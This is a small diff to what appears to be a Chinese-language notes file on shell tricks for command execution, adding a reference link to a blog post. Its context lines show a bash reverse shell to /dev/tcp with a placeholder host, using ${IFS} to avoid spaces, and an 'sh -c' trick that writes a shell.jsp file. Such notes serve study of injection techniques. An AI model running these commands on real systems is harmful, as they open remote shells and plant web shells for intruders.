@@ -32,6 +32,7 @@ bash -c bash${IFS}-i${IFS}>&/dev/tcp/XXXXX/XX<&1
 
 ```
 并且执行命令
+https://codewhitesec.blogspot.com/2015/03/sh-or-getting-shell-environment-from.html
 ```bash
 sh -c $@ | sh . echo `echo shell>shell.jsp`
 ```
